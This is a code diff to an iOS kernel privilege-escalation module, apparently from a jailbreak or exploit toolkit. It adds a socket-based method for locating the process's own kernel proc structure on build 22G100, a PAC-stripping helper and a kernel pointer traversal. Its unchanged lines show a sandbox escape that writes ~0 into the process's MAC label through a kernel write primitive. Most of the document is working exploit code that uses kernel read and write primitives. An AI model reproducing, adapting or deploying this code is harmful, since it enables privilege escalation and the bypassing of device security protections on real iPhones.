@@ -8,6 +8,7 @@
 #import "Lum1naBoard.h"
 #import "Lum1naKreadLane.h"
 #import "Lum1naProcFind.h"
+#import "../Exploit/Lum1naCS2Core.h"
 #import "../Exploit/LabRuntimeOffsets.h"
 #import "../Exploit/LabLocalTime.h"
 #import "../Exploit/lumina_core.h"
@@ -62,6 +63,13 @@ static BOOL el_looks_zone(uint64_t v) {
 static BOOL el_looks_static(uint64_t v) {
     return lumina_kptr_static(v) != 0;
 }
+/* XPACI only a pointer that is not already a canonical kernel VA. The
+   AGX-RW-iOS-PoC read_pointer() does the same; unconditional XPACI on an
+   unsigned canonical pointer can clear its high bits. */
+static uint64_t el_unpac(uint64_t v) {
+    if (v >= 0xffff000000000000ULL) return v;
+    return cs2_unpac_ptr(v);
+}
 
 @implementation Lum1naElevate
 
@@ -94,11 +102,25 @@ static BOOL el_looks_static(uint64_t v) {
            for bsd_info (a zone pointer whose +pid is ours and whose
            +proc_ro is a zone pointer). Dopamine's ksymbol(allproc) route
            needs XPF; this route needs only the live kread lane. */
-        el_log(s, @"kernproc underived — symbol-free locator (task kobject → bsd_info scan)");
+        el_log(s, @"kernproc underived — symbol-free locator");
         NSString *how = nil;
-        selfp = Lum1naFindSelfProc((uint32_t)mypid, po->proc_pid,
-                                   po->proc_proc_ro, &how);
-        el_log(s, @"locator: %@", how ?: @"?");
+        /* 22G100 socket ladder first: the ClearSword lane already holds the
+           rw inpcb KVA. pcb -> socket.so_background_thread -> thread.t_ro ->
+           thread_ro.proc (AGX-RW-iOS-PoC 22G100). */
+        if (Lum1naCS2Core_IsLive()) {
+            uint64_t pcb = Lum1naCS2Core_RwSocketPcb();
+            if (pcb && po->socket_so_background_thread) {
+                el_log(s, @"cs2 lane: socket→thread→proc locator (22G100 ladder)");
+                selfp = Lum1naFindSelfProcViaSocket(po, (uint32_t)mypid, pcb, &how);
+                el_log(s, @"socket locator: %@", how ?: @"?");
+            }
+        }
+        if (!selfp) {
+            el_log(s, @"kobject fallback: mach_port_kobject(task) → bsd_info scan");
+            selfp = Lum1naFindSelfProc((uint32_t)mypid, po->proc_pid,
+                                       po->proc_proc_ro, &how);
+            el_log(s, @"kobject locator: %@", how ?: @"?");
+        }
         if (!selfp) {
             el_bad(s, @"elevate HOLD - self-proc not located without allproc.");
             el_log(s, @"Fallbacks: tap P094 kernproc derive (catalog p094), or a jailbroken provider.");
@@ -128,7 +150,7 @@ static BOOL el_looks_static(uint64_t v) {
         uint64_t cur = kernproc;
         for (int i = 0; i < 4096; i++) {
             if (el_kread32(cur + po->proc_pid) == (uint32_t)mypid) { selfp = cur; break; }
-            uint64_t prev = cs2_unpac_ptr(el_kread64(cur + po->proc_list_prev));
+            uint64_t prev = el_unpac(el_kread64(cur + po->proc_list_prev));
             if (!prev || prev == cur) break;
             if (el_looks_zone(prev)) { cur = prev; continue; }
             if (el_looks_static(prev)) {
@@ -145,9 +167,21 @@ static BOOL el_looks_static(uint64_t v) {
         el_ok(s, @"proc_self = 0x%llx (pid %d)", (unsigned long long)selfp, mypid);
     }
 
+    /* Read-only 22G100 traversal receipt: proc_ro -> task -> vm_map -> pmap.
+       This validates the offsets on-device before any pmap write. */
+    if (selfp && po->proc_ro_task && po->task_map && po->map_pmap) {
+        uint64_t p_ro = el_unpac(el_kread64(selfp + po->proc_proc_ro));
+        uint64_t task = el_unpac(el_kread64(p_ro + po->proc_ro_task));
+        uint64_t vmap = el_unpac(el_kread64(task + po->task_map));
+        uint64_t pmap = el_unpac(el_kread64(vmap + po->map_pmap));
+        el_log(s, @"traversal: proc_ro=0x%llx task=0x%llx map=0x%llx pmap=0x%llx",
+               (unsigned long long)p_ro, (unsigned long long)task,
+               (unsigned long long)vmap, (unsigned long long)pmap);
+    }
+
     // 2. proc -> proc_ro -> ucred
-    uint64_t proc_ro = cs2_unpac_ptr(el_kread64(selfp + po->proc_proc_ro));
-    uint64_t ucred = cs2_unpac_ptr(el_kread64(proc_ro + po->pro_ro_ucred));
+    uint64_t proc_ro = el_unpac(el_kread64(selfp + po->proc_proc_ro));
+    uint64_t ucred = el_unpac(el_kread64(proc_ro + po->pro_ro_ucred));
     if (!el_looks_zone(ucred) && !(ucred >= 0xFFFFFFF000000000ULL)) {
         el_bad(s, @"elevate HOLD - ucred 0x%llx implausible", (unsigned long long)ucred);
         return s;
@@ -205,7 +239,7 @@ static BOOL el_looks_static(uint64_t v) {
     // 5. unsandbox: mac_label_set(label, 1, -1) semantics =
     //    kwrite64(label + (slot+1)*8, ~0) on proc_ro kernels
     //    (Dopamine kernel.c verbatim shape).
-    uint64_t label = cs2_unpac_ptr(el_kread64(ucred + po->ucred_label));
+    uint64_t label = el_unpac(el_kread64(ucred + po->ucred_label));
     if (el_looks_zone(label) || label >= 0xFFFFFFF000000000ULL) {
         if (!el_kwrite64(label + 0x10, ~0ULL)) {
             el_bad(s, @"elevate - MAC label write failed at 0x%llx", (unsigned long long)(label + 0x10));
